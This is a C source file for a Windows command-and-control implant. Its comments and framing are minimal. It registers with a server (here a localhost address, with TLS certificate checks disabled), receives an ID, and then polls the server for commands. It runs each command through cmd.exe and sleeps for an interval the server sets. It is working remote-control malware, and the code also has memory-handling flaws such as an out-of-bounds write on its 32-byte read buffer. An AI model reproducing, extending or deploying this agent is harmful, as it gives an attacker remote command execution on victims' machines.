#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>

#pragma warning(disable : 4996)
#pragma comment (lib, "Wininet.lib")

#define INTERNET_FLAG_IGNORE_UNKNOWN_CA 0x00000100

BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {

	HINTERNET hInternet = NULL,
		hInternetFile = NULL;
	PBYTE pBytes = NULL;
	DWORD dwBytesRead = NULL;

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	DWORD dwFlags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
		INTERNET_FLAG_IGNORE_UNKNOWN_CA;

	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, dwFlags, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pBytes = (PBYTE)LocalAlloc(LPTR, 32);

	if (!InternetReadFile(hInternetFile, pBytes, 32, &dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pBytes[dwBytesRead] = '\0';

	memcpy(output, pBytes, dwBytesRead);

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

int main() {
	BOOL default_time = TRUE;
	wchar_t Base_Url[256] = L"https://127.0.0.1:5000/";
	wchar_t Register_Url[256];
	memcpy(Register_Url, Base_Url, sizeof(Register_Url));
	LPCWSTR Register_Endpoint = L"agent/register";
	lstrcatW(Register_Url, Register_Endpoint);
	wprintf(L"%s\n", Register_Url);

	char request_output[256] = { 0 };
	for (int i = 0; i < 30; i++) {
		if (!SendRequest(Register_Url, request_output)) {
			Sleep(30 * 1000);
			continue;
		}
		else {
			break;
		}
	}
	SendRequest(Register_Url, request_output);
	printf("My UUID: %s\n", request_output);

	wchar_t wide_request_output[256] = { 0 };
	MultiByteToWideChar(CP_UTF8, 0, request_output, -1, wide_request_output, 256);

	wchar_t CommandUrl[256];
	memcpy(CommandUrl, Base_Url, 256 * sizeof(wchar_t));
	wchar_t agent_endpoint[256] = L"agent/";
	wchar_t command_endpoint[256] = L"/command";
	wcscat(CommandUrl, agent_endpoint);
	wcscat(CommandUrl, wide_request_output);
	wcscat(CommandUrl, command_endpoint);
	wprintf(L"%s\n", CommandUrl);

	char command[256] = {0};
	char command_stripped[256] = {0};
	char time[256] = { 0 };
	BOOL reached = FALSE;

	while (TRUE) {
		memset(command, 0, sizeof(command));
		memset(command_stripped, 0, sizeof(command_stripped));
		reached = FALSE;
		
		SendRequest(CommandUrl, command);
		
		char no_command_set[] = "No command set";
		if (strcmp(command, no_command_set) == 0) {
			printf("Recieved no Command\n");
		}
		else {
			printf("Recieved Command\n");

			for (int i = 0; i < strlen(command); i++) {
				if (command[i] == ';') {
					reached = TRUE;
					default_time = FALSE;
					memset(time, 0, sizeof(time));
					continue;
				}
				else if (reached) {
					strncat_s(time, sizeof(time), &command[i], 1);
				}
				else {
					strncat_s(command_stripped, sizeof(command_stripped), &command[i], 1);
				}
			}


			wchar_t Process_Name[256];
			swprintf(Process_Name, 256, L"/c %S", command_stripped);

			printf("Process_Name: %ls\n", Process_Name);

			STARTUPINFOW			SiW = { 0 };
			PROCESS_INFORMATION		Pi = { 0 };

			SiW.cb = sizeof(STARTUPINFOEXA);

			if (!CreateProcessW(
				L"C:\\Windows\\System32\\cmd.exe",
				Process_Name,
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				NULL,
				&SiW,
				&Pi)) {
				printf("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
			}

			else {
				printf("Process created\n");


				WaitForSingleObject(Pi.hProcess, INFINITE);


				CloseHandle(Pi.hProcess);
				CloseHandle(Pi.hThread);
			}
		}
		if (default_time) {
			Sleep(30 * 1000);
		}
		else {
			int int_time;
			int_time = atoi(time);
			Sleep(int_time * 1000);
		}
	
	}
	return 0;
}
